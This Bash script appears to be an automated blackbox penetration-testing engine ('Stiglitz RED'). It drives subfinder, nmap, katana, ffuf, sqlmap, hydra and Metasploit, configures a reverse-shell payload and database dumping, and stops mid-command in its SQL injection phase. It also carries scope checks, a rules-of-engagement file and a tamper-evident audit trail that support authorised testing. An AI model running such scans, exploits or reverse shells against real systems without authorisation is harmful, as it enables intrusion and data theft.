#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
#  Stiglitz RED v7.0 — Blackbox Pentest Engine
# ═══════════════════════════════════════════════════════════════════════════════
#
#  Modos de operação:
#    Blackbox  — bash stiglitz_red.sh -t https://target.com [-p profile]
#    Stiglitz     — bash stiglitz_red.sh -d scan_dir           [-p profile]
#
#  Fases: recon → surface → crawl → ingest → bizlogic → sqli → xss → brute → services → report
#
#  Uso completo: bash stiglitz_red.sh --help
# ═══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

readonly VERSION="7.0-blackbox"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"; readonly SCRIPT_DIR
readonly LIB="$SCRIPT_DIR/lib"

trap 'echo; echo "[!] Interrompido pelo usuário — abortando."; exit 130' INT TERM

# ── Cores ──────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'
BLD='\033[1m'; DIM='\033[2m'; RST='\033[0m'

# ── Defaults ───────────────────────────────────────────────────────────────────
PROFILE="lab"
TARGET=""
SCAN_DIR=""
SCOPE_DOMAINS=()
SCOPE_FILE=""
ROE_FILE=""
PROFILE_FILE=""
AUTH_COOKIE=""
AUTH_HEADER=""
SKIP_PHASES=()
ONLY_PHASES=()
DRY_RUN=false
RESUME=false
NO_MSF=false
LHOST=""
LPORT="4444"
THREADS_OVERRIDE=""
OUTDIR_OVERRIDE=""
MODE="blackbox"
LOG="/dev/null"
OUTDIR=""
STATE_FILE=""

# ── Helpers ────────────────────────────────────────────────────────────────────
info()  { echo -e "${GRN}[✓]${RST} $*"; }
warn()  { echo -e "${YLW}[!]${RST} $*"; }
fail()  { echo -e "${RED}[✗]${RST} $*"; }
phase() {
    echo -e "\n${CYN}═══════════════════════════════════════════════════════════${RST}"
    echo -e "${CYN}  $*${RST}"
    echo -e "${CYN}═══════════════════════════════════════════════════════════${RST}"
}
log()   { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG"; }
has()   { command -v "$1" &>/dev/null; }

# ── Audit trail tamper-evident (hash chain) ────────────────────────────────────
# Cada entrada: SEQ | ISO_TS | EVENT | prev_hash:curr_hash
# curr_hash = sha256(prev || ts || event)[:16]. Seed = roe_sha (amarra o trail
# ao documento de autorização). Verificável offline via verify_audit.py.
AUDIT_LOG=""
_audit_seq=0
audit_init() {
    [ -z "$OUTDIR" ] && return 0
    AUDIT_LOG="$OUTDIR/audit.log"
    : > "$AUDIT_LOG"
    chmod 600 "$AUDIT_LOG" 2>/dev/null || true
    local seed="${1:-0000000000000000}"
    _audit_seq=0
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    local event="AUDIT_INIT seed=$seed"
    local h
    h=$(printf '%s|%s|%s' "$seed" "$ts" "$event" | sha256sum | cut -c1-16)
    printf '%04d | %s | %s | %s:%s\n' "$_audit_seq" "$ts" "$event" "$seed" "$h" >> "$AUDIT_LOG"
}
audit() {
    [ -z "$AUDIT_LOG" ] && return 0
    local event="$*"
    local prev
    prev=$(awk -F'[ :]+' 'END{print $NF}' "$AUDIT_LOG" 2>/dev/null)
    [ -z "$prev" ] && prev="0000000000000000"
    _audit_seq=$((_audit_seq + 1))
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    local h
    h=$(printf '%s|%s|%s' "$prev" "$ts" "$event" | sha256sum | cut -c1-16)
    printf '%04d | %s | %s | %s:%s\n' "$_audit_seq" "$ts" "$event" "$prev" "$h" >> "$AUDIT_LOG"
}
audit_seal() {
    # Sela a CABEÇA do hash-chain com HMAC-SHA256(STIGLITZ_AUDIT_KEY). Sem chave, não sela.
    { [ -z "$AUDIT_LOG" ] || [ ! -s "$AUDIT_LOG" ]; } && return 0
    if [ -z "${STIGLITZ_AUDIT_KEY:-}" ]; then
        audit "SEAL_SKIPPED reason=no_key" 2>/dev/null || true
        return 0
    fi
    local head
    head=$(awk -F'[ :]+' 'END{print $NF}' "$AUDIT_LOG" 2>/dev/null)
    [ -z "$head" ] && return 0
    local mac
    if has openssl; then
        mac=$(printf '%s' "$head" | openssl dgst -sha256 -hmac "$STIGLITZ_AUDIT_KEY" -r 2>/dev/null | cut -d' ' -f1)
    else
        mac=$(STIGLITZ_AUDIT_KEY="$STIGLITZ_AUDIT_KEY" python3 -c 'import os,hmac,hashlib,sys;print(hmac.new(os.environ["STIGLITZ_AUDIT_KEY"].encode(),sys.argv[1].encode(),hashlib.sha256).hexdigest())' "$head" 2>/dev/null)
    fi
    [ -z "$mac" ] && { warn "audit_seal: falha ao computar HMAC — não selado"; return 0; }
    printf 'HMAC-SHA256 %s head=%s\n' "$mac" "$head" > "$AUDIT_LOG.seal"
    chmod 600 "$AUDIT_LOG.seal" 2>/dev/null || true
}
dry_cmd() {
    if [ "$DRY_RUN" = true ]; then
        echo -e "  ${DIM}[DRY-RUN]${RST} $*"
        return 0
    fi
    "$@"
}

usage() {
    cat << 'EOF'

Stiglitz RED v7.0 — Blackbox Pentest Engine

MODOS:
  bash stiglitz_red.sh -t https://target.com [-p profile]  # Blackbox
  bash stiglitz_red.sh -d scan_dir           [-p profile]  # Integração Stiglitz

OPÇÕES PRINCIPAIS:
  -t, --target URL        URL alvo (modo blackbox)
  -d, --dir SCAN_DIR      Diretório de scan Stiglitz (modo integração)
  -p, --profile PROFILE   Perfil: lab|staging|production (padrão: lab)
  --scope DOMAIN          Domínio em escopo (padrão: derivado do alvo)
  --scope-file FILE       Arquivo com domínios/IPs em escopo (um por linha)
  --roe FILE              Documento de RoE (autorização). Registra SHA-256 no
                          audit trail; obrigatório para bypass do orquestrador.
  --profile-file FILE     Perfil JSON customizado (sobrescreve PROFILE_*).
                          Validado por lib/profile_loader.py.
  --auth-cookie COOKIE    Cookie de autenticação ("session=abc123")
  --auth-header HEADER    Header de auth ("Authorization: Bearer token")

CONTROLE DE FASES:
  --skip FASES            Fases a pular: recon,surface,crawl,bizlogic,sqli,xss,brute,services
  --only FASES            Executar apenas estas fases (vírgula separado)
  --dry-run               Simular sem executar ferramentas
  --resume                Retomar do último checkpoint

AVANÇADO:
  --no-msf                Desabilitar Metasploit
  --lhost IP              IP para payloads Metasploit (padrão: auto-detect)
  --lport PORT            Porta Metasploit (padrão: 4444)
  --threads N             Override de threads por fase
  --output-dir DIR        Nome customizado do diretório de saída

PERFIS:
  lab        Sem restrições, agressividade máxima. Ambiente descartável.
  staging    Agressividade alta, dump habilitado. Para homologação.
  production Impacto mínimo, apenas confirmação. Janela de manutenção.

EXEMPLOS:
  bash stiglitz_red.sh -t https://api.company.com -p staging
  bash stiglitz_red.sh -t https://target.com --auth-cookie "token=abc" --skip brute
  bash stiglitz_red.sh -d scan_target.com_20260514_120000 -p production
  bash stiglitz_red.sh -t https://target.com --only sqli,xss --dry-run
  bash stiglitz_red.sh -t https://target.com --scope-file scope.txt --resume

EOF
    exit 0
}

# ── Parser de argumentos ───────────────────────────────────────────────────────
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t|--target)    TARGET="$2";           shift 2 ;;
            -d|--dir)       SCAN_DIR="$2";          shift 2 ;;
            -p|--profile)   PROFILE="$2";           shift 2 ;;
            --scope)        SCOPE_DOMAINS+=("$2");  shift 2 ;;
            --scope-file)   SCOPE_FILE="$2";        shift 2 ;;
            --roe)          ROE_FILE="$2";          shift 2 ;;
            --profile-file) PROFILE_FILE="$2";      shift 2 ;;
            --auth-cookie)  AUTH_COOKIE="$2";       shift 2 ;;
            --auth-header)  AUTH_HEADER="$2";       shift 2 ;;
            --skip)         IFS=',' read -ra SKIP_PHASES <<< "$2"; shift 2 ;;
            --only)         IFS=',' read -ra ONLY_PHASES  <<< "$2"; shift 2 ;;
            --dry-run)      DRY_RUN=true;            shift ;;
            --resume)       RESUME=true;             shift ;;
            --no-msf)       NO_MSF=true;             shift ;;
            --lhost)        LHOST="$2";              shift 2 ;;
            --lport)        LPORT="$2";              shift 2 ;;
            --threads)      THREADS_OVERRIDE="$2";  shift 2 ;;
            --output-dir)   OUTDIR_OVERRIDE="$2";   shift 2 ;;
            -h|--help)      usage ;;
            *) warn "Argumento desconhecido: $1"; shift ;;
        esac
    done
}

# ── Validação ──────────────────────────────────────────────────────────────────
validate() {
    if [ -n "$TARGET" ]; then
        MODE="blackbox"
    elif [ -n "$SCAN_DIR" ]; then
        MODE="scan"
        [ -d "$SCAN_DIR" ] || { fail "Diretório não encontrado: $SCAN_DIR"; exit 1; }
    else
        fail "Informe -t <url> (blackbox) ou -d <scan_dir> (Stiglitz integração)."
        echo "  bash stiglitz_red.sh --help"
        exit 1
    fi

    # Com --profile-file, qualquer nome (regex restrita) é permitido —
    # o JSON fornece os valores. Sem --profile-file, exige enum embutido.
    if [ -n "$PROFILE_FILE" ]; then
        [ -f "$PROFILE_FILE" ] || { fail "Profile file não encontrado: $PROFILE_FILE"; exit 1; }
        if ! echo "$PROFILE" | grep -qE '^[a-zA-Z][a-zA-Z0-9._-]{0,40}$'; then
            fail "Perfil inválido: '$PROFILE' (use [a-zA-Z][a-zA-Z0-9._-]*)"; exit 1
        fi
    else
        case "$PROFILE" in
            lab|staging|production) ;;
            *) fail "Perfil inválido: '$PROFILE'. Use: lab|staging|production (ou --profile-file)"; exit 1 ;;
        esac
    fi

    # Derivar domínio-base para scope
    if [ "${#SCOPE_DOMAINS[@]}" -eq 0 ]; then
        local base_domain
        if [ -n "$TARGET" ]; then
            base_domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
        else
            base_domain=$(basename "$SCAN_DIR" | sed 's/^scan_//' | sed 's/_[0-9]\{8\}_[0-9]\{6\}$//')
        fi
        SCOPE_DOMAINS=("$base_domain")
    fi

    # Carregar scope file
    if [ -n "$SCOPE_FILE" ]; then
        [ -f "$SCOPE_FILE" ] || { fail "Scope file não encontrado: $SCOPE_FILE"; exit 1; }
        while IFS= read -r line; do
            [[ -n "$line" && ! "$line" =~ ^# ]] && SCOPE_DOMAINS+=("$line")
        done < "$SCOPE_FILE"
    fi

    # Validar cada domínio de escopo — alimenta nmap, RC do Metasploit e hydra.
    # Bloqueia metacaracteres que permitiriam injeção a jusante.
    local _d
    for _d in "${SCOPE_DOMAINS[@]}"; do
        if ! echo "$_d" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$' && \
           ! echo "$_d" | grep -qE '^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'; then
            fail "Domínio de escopo inválido: '$_d'"
            exit 1
        fi
    done

    # Validar OUTDIR_OVERRIDE (interpolado em paths/heredocs)
    if [ -n "$OUTDIR_OVERRIDE" ] && ! echo "$OUTDIR_OVERRIDE" | grep -qE '^[A-Za-z0-9._/-]+$'; then
        fail "--output-dir contém caracteres inválidos: $OUTDIR_OVERRIDE"
        exit 1
    fi

    # LHOST auto-detect
    if [ -z "$LHOST" ]; then
        LHOST=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' | head -1 || true)
        [ -z "$LHOST" ] && LHOST=$(hostname -I 2>/dev/null | awk '{print $1}' || true)
        [ -z "$LHOST" ] && LHOST="127.0.0.1"
    fi
}

# ── Carrega profiles.conf ──────────────────────────────────────────────────────
load_profiles() {
    # shellcheck disable=SC2034  # arrays de perfil populados/lidos dinamicamente
    declare -gA PROFILE_DESCRIPTION \
                PROFILE_SQLMAP_LEVEL PROFILE_SQLMAP_RISK PROFILE_SQLMAP_THREADS PROFILE_SQLMAP_DUMP \
                PROFILE_MSF_PAYLOAD PROFILE_BRUTE_FORCE PROFILE_NIKTO_ENABLED \
                PROFILE_MAX_EXPLOITS PROFILE_CRAWL_DEPTH PROFILE_XSS_WORKERS \
                PROFILE_RECON_THREADS PROFILE_TIMEOUT_SQLMAP_URL PROFILE_TIMEOUT_SQLMAP_CRAWL \
                PROFILE_TIMEOUT_MSF PROFILE_TIMEOUT_HYDRA PROFILE_TIMEOUT_NIKTO \
                PROFILE_TIMEOUT_XSS PROFILE_TIMEOUT_CRAWL PROFILE_TIMEOUT_NMAP \
                PROFILE_BIZLOGIC_MUTATE PROFILE_BIZLOGIC_TIMEOUT

    if [ -f "$LIB/profiles.conf" ]; then
        source "$LIB/profiles.conf"
    else
        # Defaults de emergência
        PROFILE_MAX_EXPLOITS=([lab]=999  [staging]=50  [production]=10)
        PROFILE_SQLMAP_LEVEL=([lab]=5    [staging]=3   [production]=1)
        PROFILE_SQLMAP_RISK=(  [lab]=3   [staging]=2   [production]=1)
        PROFILE_SQLMAP_THREADS=([lab]=10 [staging]=5   [production]=1)
        PROFILE_BRUTE_FORCE=(  [lab]=true [staging]=true [production]=false)
        PROFILE_NIKTO_ENABLED=([lab]=true [staging]=true [production]=false)
        PROFILE_TIMEOUT_SQLMAP_URL=([lab]=600 [staging]=300 [production]=120)
        PROFILE_TIMEOUT_HYDRA=(    [lab]=600 [staging]=300 [production]=120)
        PROFILE_TIMEOUT_NIKTO=(    [lab]=1200 [staging]=700 [production]=300)
        PROFILE_TIMEOUT_MSF=(      [lab]=3600 [staging]=1800 [production]=600)
        PROFILE_TIMEOUT_XSS=(      [lab]=600  [staging]=300  [production]=120)
        PROFILE_TIMEOUT_CRAWL=(    [lab]=900  [staging]=600  [production]=300)
        PROFILE_TIMEOUT_NMAP=(     [lab]=900  [staging]=600  [production]=300)
        PROFILE_CRAWL_DEPTH=(      [lab]=5    [staging]=3    [production]=2)
        PROFILE_XSS_WORKERS=(      [lab]=5    [staging]=3    [production]=1)
        PROFILE_RECON_THREADS=(    [lab]=100  [staging]=50   [production]=20)
        PROFILE_MSF_PAYLOAD=([lab]="generic/shell_reverse_tcp" [staging]="generic/shell_reverse_tcp" [production]="NONE")
    fi
}

# ── Checkpoint ─────────────────────────────────────────────────────────────────
# checkpoint_done também emite PHASE_END no audit trail (hash chain).
checkpoint_done() {
    echo "$1" >> "$STATE_FILE"
    audit "PHASE_END name=$1 result=ok"
}
checkpoint_skip() {
    if [ "$RESUME" = true ] && grep -qxF "$1" "$STATE_FILE" 2>/dev/null; then
        audit "PHASE_SKIP name=$1 reason=checkpoint"
        return 0
    fi
    return 1
}

# ── Phase gate ─────────────────────────────────────────────────────────────────
phase_enabled() {
    local name="$1"
    for s in "${SKIP_PHASES[@]:-}"; do [[ "$s" == "$name" ]] && return 1; done
    if [ "${#ONLY_PHASES[@]}" -gt 0 ]; then
        for o in "${ONLY_PHASES[@]}"; do [[ "$o" == "$name" ]] && return 0; done
        return 1
    fi
    return 0
}

# ── Banner ─────────────────────────────────────────────────────────────────────
banner() {
    echo -e "${RED}"
    cat << 'BANNER'
  ███████╗████████╗██╗ ██████╗ ██╗     ██╗████████╗███████╗
  ██╔════╝╚══██╔══╝██║██╔════╝ ██║     ██║╚══██╔══╝╚══███╔╝
  ███████╗   ██║   ██║██║  ███╗██║     ██║   ██║     ███╔╝
  ╚════██║   ██║   ██║██║   ██║██║     ██║   ██║    ███╔╝
  ███████║   ██║   ██║╚██████╔╝███████╗██║   ██║   ███████╗
  ╚══════╝   ╚═╝   ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝
BANNER
    echo -e "${RST}"
    echo -e "  ${YLW}${BLD}v${VERSION}${RST} — RED · Blackbox Pentest Engine"
    echo -e "  ${DIM}Modo: ${MODE^^} | Perfil: ${PROFILE^^} | Escopo: ${SCOPE_DOMAINS[*]}${RST}"
    [ "$DRY_RUN" = true ] && echo -e "  ${YLW}[DRY-RUN MODE]${RST}"
    [ "$RESUME" = true ]  && echo -e "  ${CYN}[RESUMINDO DE CHECKPOINT]${RST}"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 1 — RECON (subfinder + httpx)
# ═══════════════════════════════════════════════════════════════════════════════
run_recon() {
    phase "FASE 1 — RECON (subfinder + httpx)"
    audit "PHASE_START name=recon"

    if [ "$MODE" != "blackbox" ]; then
        info "Modo Stiglitz — recon ignorado (dados existem em $SCAN_DIR)"
        audit "PHASE_END name=recon result=skipped reason=scan-mode"
        return 0
    fi
    phase_enabled "recon"   || { warn "Fase 'recon' ignorada (--skip)"; audit "PHASE_END name=recon result=skipped reason=filter"; return 0; }
    checkpoint_skip "recon" && { info "Recon: retomado de checkpoint — pulando"; return 0; }

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] recon: simulando subfinder + httpx em ${SCOPE_DOMAINS[0]}"
        mkdir -p "$OUTDIR/recon"
        echo "${SCOPE_DOMAINS[0]}" > "$OUTDIR/recon/subdomains.txt"
        echo "https://${SCOPE_DOMAINS[0]}" > "$OUTDIR/data/live_hosts.txt"
        checkpoint_done "recon"; return 0
    fi

    source "$LIB/recon.sh"
    run_recon_phase \
        "${SCOPE_DOMAINS[0]}" \
        "$OUTDIR/recon" \
        "$OUTDIR/data/live_hosts.txt" \
        "${THREADS_OVERRIDE:-${PROFILE_RECON_THREADS[$PROFILE]:-50}}"

    checkpoint_done "recon"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 2 — SURFACE (nmap)
# ═══════════════════════════════════════════════════════════════════════════════
run_surface() {
    phase "FASE 2 — SURFACE (nmap)"
    audit "PHASE_START name=surface"

    phase_enabled "surface"   || { warn "Fase 'surface' ignorada (--skip)"; audit "PHASE_END name=surface result=skipped reason=filter"; return 0; }
    checkpoint_skip "surface" && { info "Surface: retomado de checkpoint — pulando"; return 0; }

    # Modo Stiglitz: reusar nmap existente
    if [ "$MODE" = "scan" ] && [ -f "$SCAN_DIR/raw/nmap.txt" ]; then
        cp "$SCAN_DIR/raw/nmap.txt" "$OUTDIR/data/nmap.txt"
        grep -E '^[0-9]+/tcp.*open' "$OUTDIR/data/nmap.txt" \
            | awk '{print $1, $3, $4, $5, $6}' > "$OUTDIR/data/open_services.txt"
        info "Surface: $(wc -l < "$OUTDIR/data/open_services.txt") serviço(s) do Stiglitz"
        checkpoint_done "surface"
        return 0
    fi

    if ! has nmap; then
        warn "nmap não encontrado — fase surface ignorada"
        touch "$OUTDIR/data/open_services.txt"
        checkpoint_done "surface"
        return 0
    fi

    local targets_file="$OUTDIR/data/live_hosts.txt"
    if [ ! -f "$targets_file" ] || [ ! -s "$targets_file" ]; then
        echo "${SCOPE_DOMAINS[0]}" > "$targets_file"
    fi

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] surface: simulando nmap em $(wc -l < "$targets_file") host(s)"
        touch "$OUTDIR/data/nmap.txt" "$OUTDIR/data/open_services.txt"
        checkpoint_done "surface"; return 0
    fi

    local _timeout="${PROFILE_TIMEOUT_NMAP[$PROFILE]:-600}"
    # Timing por perfil — production é deliberadamente discreto (menos carga/ruído)
    local _nmap_timing _nmap_rate
    case "$PROFILE" in
        production) _nmap_timing="-T2"; _nmap_rate="100" ;;
        staging)    _nmap_timing="-T3"; _nmap_rate="200" ;;
        *)          _nmap_timing="-T4"; _nmap_rate="300" ;;
    esac
    log "Nmap em $(wc -l < "$targets_file") host(s)... (timing=$_nmap_timing)"

    dry_cmd timeout "$_timeout" nmap -iL "$targets_file" \
        -sV -O --open "$_nmap_timing" --min-rate "$_nmap_rate" \
        -oN "$OUTDIR/data/nmap.txt" \
        -oG "$OUTDIR/data/nmap_grep.txt" \
        2>&1 | tee -a "$LOG" || true

    grep -E '^[0-9]+/tcp.*open' "$OUTDIR/data/nmap.txt" 2>/dev/null \
        | awk '{print $1, $3, $4, $5, $6}' > "$OUTDIR/data/open_services.txt" || true
    info "Surface: $(wc -l < "$OUTDIR/data/open_services.txt" 2>/dev/null || echo 0) porta(s) abertas"

    checkpoint_done "surface"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  INGESTÃO — Priorização de URLs para exploração
# ═══════════════════════════════════════════════════════════════════════════════
run_ingest() {
    phase "INGESTÃO — Priorização de alvos"
    audit "PHASE_START name=ingest"

    # Inicializar arquivos de dados
    touch "$OUTDIR/data/cves_found.txt" \
          "$OUTDIR/data/zap_high_crit.txt" \
          "$OUTDIR/data/open_services.txt"

    if [ "$MODE" = "scan" ]; then
        # Extrair CVEs do nuclei
        if [ -f "$SCAN_DIR/raw/nuclei.json" ]; then
            python3 - "$SCAN_DIR/raw/nuclei.json" > "$OUTDIR/data/cves_found.txt" 2>/dev/null << 'PYEOF'
import sys, json
cves = set()
try:
    for line in open(sys.argv[1]):
        try:
            d = json.loads(line)
            cl = d.get('info',{}).get('classification',{}).get('cve-id',[])
            if isinstance(cl, str): cl = [cl]
            for c in cl:
                if c and str(c).upper().startswith('CVE'): cves.add(c.upper())
        except: pass
except: pass
print('\n'.join(sorted(cves)))
PYEOF
        fi

        # Extrair ZAP findings
        if [ -f "$SCAN_DIR/raw/zap_alerts.json" ]; then
            python3 - "$SCAN_DIR/raw/zap_alerts.json" > "$OUTDIR/data/zap_high_crit.txt" 2>/dev/null << 'PYEOF'
import json, sys
try:
    data = json.load(open(sys.argv[1]))
    alerts = data.get('alerts', []) if isinstance(data, dict) else data
    for a in alerts:
        if not isinstance(a, dict): continue
        risk = a.get('risk','')
        if risk in ('High','Critical','Medium'):
            print(f"{risk}|{a.get('alert','')}|{a.get('url','')}")
except: pass
PYEOF
        fi

        # Derivar TARGET
        local domain
        domain=$(basename "$SCAN_DIR" | sed 's/^scan_//' | sed 's/_[0-9]\{8\}_[0-9]\{6\}$//')
        [ -z "$TARGET" ] && TARGET="https://${domain}"
    fi

    _build_scored_targets
    local n_urls
    n_urls=$(wc -l < "$OUTDIR/data/targets_scored.txt" 2>/dev/null); n_urls=${n_urls:-0}
    info "Ingestão: ${n_urls} URL(s) priorizadas para teste"
    log "Ingestão: ${n_urls} URLs | CVEs: $(wc -l < "$OUTDIR/data/cves_found.txt" 2>/dev/null || echo 0)"
    audit "PHASE_END name=ingest result=ok urls=${n_urls}"
}

# ── Fase: Lógica de negócio / Authz (IDOR/BOLA/privesc/amount/race) ──────────
run_bizlogic() {
    phase_enabled "bizlogic" || { warn "Fase 'bizlogic' ignorada (--skip)"; log "Fase bizlogic: ignorada (--skip)"; audit "PHASE_END name=bizlogic result=skipped reason=filter"; return 0; }
    audit "PHASE_START name=bizlogic"
    local cfg="${BIZLOGIC_CONFIG:-}"
    if [ -z "$cfg" ]; then
        for c in "$SCAN_DIR/bizlogic.yaml" "$SCAN_DIR/bizlogic.json" \
                 "$OUTDIR/bizlogic.yaml" "$OUTDIR/bizlogic.json"; do
            [ -f "$c" ] && { cfg="$c"; break; }
        done
    fi
    if [ -z "$cfg" ] || [ ! -f "$cfg" ]; then
        info "Lógica de negócio/Authz: sem config (defina \$BIZLOGIC_CONFIG ou bizlogic.yaml) — fase pulada"
        audit "PHASE_END name=bizlogic result=skip"
        return 0
    fi
    banner "LÓGICA DE NEGÓCIO / AUTHZ (IDOR/BOLA/privesc/amount/race)"
    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] bizlogic: simulando testes (config: $cfg) — nenhuma requisição enviada"
        audit "PHASE_END name=bizlogic result=dryrun"
        return 0
    fi
    local scope_csv; scope_csv=$(IFS=,; echo "${SCOPE_DOMAINS[*]}")
    local biz_timeout="${PROFILE_BIZLOGIC_TIMEOUT[$PROFILE]:-600}"
    # Gate global "EU AUTORIZO" já foi confirmado no authorization_gate → roe_accept=1.
    bash "$LIB/bizlogic.sh" "$OUTDIR" "$PROFILE" "$cfg" "$scope_csv" "1" "$biz_timeout" || true
    audit "PHASE_END name=bizlogic result=ok"
}

_build_scored_targets() {
    local tmp_raw="$OUTDIR/data/raw_urls.txt"
    : > "$tmp_raw"

    # 1. URLs do crawl
    [ -f "$OUTDIR/crawl/katana_urls.txt" ]  && cat "$OUTDIR/crawl/katana_urls.txt"  >> "$tmp_raw"
    [ -f "$OUTDIR/crawl/ffuf_urls.txt" ]    && cat "$OUTDIR/crawl/ffuf_urls.txt"    >> "$tmp_raw"

    # 2. URLs do Stiglitz — apenas arquivos estruturados, filtrando domínios de advisory externos
    if [ "$MODE" = "scan" ] && [ -d "$SCAN_DIR" ]; then
        local _advisory_domains='github\.com/security|github\.com/advisories|nvd\.nist\.gov|cve\.org|vercel\.com/changelog|cve\.mitre\.org|first\.org|exploit-db\.com|packetstormsecurity'
        # Lê apenas raw/ e findings.json — evita capturar URLs de advisories em logs
        for _sf in "$SCAN_DIR/findings.json" "$SCAN_DIR/raw/nuclei.json" \
                    "$SCAN_DIR/raw/zap_alerts.json" "$SCAN_DIR/raw/katana_urls.txt"; do
            [ -f "$_sf" ] || continue
            grep -hoE 'https?://[^"'\'' <>()\\n]+' "$_sf" 2>/dev/null \
                | sed 's/[",\\]$//' \
                | grep -E '^https?://' \
                | grep -vE "$_advisory_domains" \
                >> "$tmp_raw" || true
        done
    fi

    # 3. Alvo base (sempre presente)
    [ -n "$TARGET" ] && echo "$TARGET" >> "$tmp_raw"

    # Score + filtro
    python3 - "$tmp_raw" "$OUTDIR/data/targets_scored.txt" "${SCOPE_DOMAINS[@]}" << 'PYEOF'
import sys, re
from urllib.parse import urlparse
raw_f, scored_f = sys.argv[1], sys.argv[2]
scope_domains = [d.strip().lower().lstrip('*.') for d in sys.argv[3:] if d.strip()]

def in_scope(url):
    # Sem escopo definido => não filtra (fail-open só quando o operador não delimitou)
    if not scope_domains:
        return True
    try:
        host = (urlparse(url).hostname or '').lower()
    except Exception:
        return False
    if not host:
        return False
    # In-scope se o host for igual ou subdomínio de algum domínio do escopo
    return any(host == d or host.endswith('.' + d) for d in scope_domains)

crit_params = re.compile(
    r'[?&](id|user|account|token|pass|password|key|secret|admin|cmd|exec|'
    r'query|q|search|file|path|url|redirect|ref|next|data|input|param|value|'
    r'action|type|name|email|username|login|page|sort|order|filter|lang|locale)=',
    re.I
)
sens_paths = re.compile(
    r'/(api|v[0-9]+|graphql|admin|login|auth|session|oauth|callback|upload|'
    r'download|export|import|webhook|debug|test|dev|internal|private|manage|'
    r'dashboard|cms|wp-admin|phpmyadmin|panel|portal)',
    re.I
)
media_ext = re.compile(
    r'\.(jpg|jpeg|png|gif|css|woff2?|eot|ttf|mp4|mp3|zip|ico|svg)(\?|$)', re.I
)

seen, results = set(), []
try:
    with open(raw_f) as fi:
        for line in fi:
            url = line.strip()
            if not url or url in seen: continue
            if media_ext.search(url): continue
            if not in_scope(url): continue
            seen.add(url)
            s = 0
            if crit_params.search(url):                       s += 5
            if url.count('=') > 1:                           s += 3
            if sens_paths.search(url):                       s += 4
            if '?' in url:                                   s += 2
            if any(d in url for d in scope_domains if d):   s += 1
            results.append((s, url))
except FileNotFoundError:
    pass

results.sort(key=lambda x: x[0], reverse=True)
with open(scored_f, 'w') as fo:
    for s, url in results:
        fo.write(f"{s}|{url}\n")
PYEOF
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 3 — CRAWL (katana + ffuf)
# ═══════════════════════════════════════════════════════════════════════════════
run_crawl() {
    phase "FASE 3 — CRAWL (katana + ffuf)"
    audit "PHASE_START name=crawl"

    phase_enabled "crawl"   || { warn "Fase 'crawl' ignorada (--skip)"; audit "PHASE_END name=crawl result=skipped reason=filter"; return 0; }
    checkpoint_skip "crawl" && { info "Crawl: retomado de checkpoint — pulando"; return 0; }

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] crawl: simulando katana + ffuf em ${TARGET:-https://${SCOPE_DOMAINS[0]}}"
        mkdir -p "$OUTDIR/crawl"
        touch "$OUTDIR/crawl/katana_urls.txt" "$OUTDIR/crawl/ffuf_urls.txt" "$OUTDIR/crawl/all_urls.txt"
        checkpoint_done "crawl"; return 0
    fi

    source "$LIB/crawl.sh"
    run_crawl_phase \
        "${TARGET:-https://${SCOPE_DOMAINS[0]}}" \
        "$OUTDIR/crawl" \
        "$AUTH_COOKIE" \
        "$AUTH_HEADER" \
        "${PROFILE_CRAWL_DEPTH[$PROFILE]:-3}" \
        "${PROFILE_TIMEOUT_CRAWL[$PROFILE]:-600}"

    checkpoint_done "crawl"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 4 — SQLi (sqlmap)
# ═══════════════════════════════════════════════════════════════════════════════
run_sqli() {
    phase "FASE 4 — SQLi (sqlmap)"
    audit "PHASE_START name=sqli"
    local _t0; _t0=$(date +%s)
    log "Fase SQLi iniciada — perfil=${PROFILE}"

    phase_enabled "sqli"   || { warn "Fase 'sqli' ignorada (--skip)"; log "Fase SQLi: ignorada (--skip)"; audit "PHASE_END name=sqli result=skipped reason=filter"; return 0; }
    checkpoint_skip "sqli" && { info "SQLi: retomado de checkpoint — pulando"; return 0; }

    if ! has sqlmap; then
        warn "sqlmap não encontrado — fase SQLi ignorada"
        log "Fase SQLi: sqlmap ausente — ignorada"
        checkpoint_done "sqli"; return 0
    fi

    if [ "$DRY_RUN" = true ]; then
        warn "[DRY-RUN] sqli: simulando sqlmap em $(wc -l < "$OUTDIR/data/targets_scored.txt" 2>/dev/null || echo 0) URL(s)"
        checkpoint_done "sqli"; return 0
    fi

    local _sqli_targets
    _sqli_targets=$(awk -F'|' '$1>=3{count++} END{print count+0}' "$OUTDIR/data/targets_scored.txt" 2>/dev/null); _sqli_targets=${_sqli_targets:-0}
    log "Fase SQLi: ${_sqli_targets} URL(s) com score≥3 (parâmetros sensíveis)"

    source "$LIB/sqli.sh"
    run_sqli_phase \
        "$OUTDIR/data/targets_scored.txt" \
        "$OUTDIR/sqlmap" \
        "$OUTDIR/exploits_confirmed.csv" \
        "${PROFILE_SQLMAP_LEVEL[$PROFILE]:-1}" \
        "${PROFILE_SQLMAP_RISK[$PROFILE]:-1}" \
